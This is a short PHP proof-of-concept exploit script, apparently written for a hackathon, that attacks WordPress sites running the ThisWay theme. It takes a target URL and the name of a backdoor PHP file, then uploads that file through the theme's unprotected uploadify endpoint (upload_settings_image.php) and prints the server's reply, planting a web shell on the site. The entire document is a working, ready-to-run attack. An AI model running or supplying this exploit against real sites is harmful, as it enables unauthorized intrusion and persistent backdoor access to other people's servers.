
<?php
system("clear");
echo "Wordpress Exploiting via third party plugin ThisWay Template\n";
echo "\033[01;31m                  IT-Solunium for Hackathon                  \033[0m\n";
echo "------------------------------------------------------------\n";
echo "\n";
echo "\n";


if ( !isset($argv[1]) or !isset($argv[2]) ) 
	{
	echo "\033[01;32m Usage: \033[0m\n \033[01;30mphp wordpress_thisway_attack_PoC <url_site_wordpress_vuln> <nom_du_backdoor.php>\033[0m\n";
	echo "\n";
	echo "\n";	
	exit(0);
	}

	$uploadfile = $argv[2];
	$url_website_vul_racine = $argv[1];	

	$ch = curl_init("http://$url_website_vul_racine/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php");

		/* For debugging
		echo("http://$url_website_vul_racine/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php");
		echo ("\n");
		echo($uploadfile);
		*/

	curl_setopt($ch, CURLOPT_POST, true); 
	curl_setopt($ch, CURLOPT_POSTFIELDS,
        array('Filedata'=>"@$uploadfile"));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$postResult = curl_exec($ch);
	curl_close($ch);
	print "$postResult";
	
?>
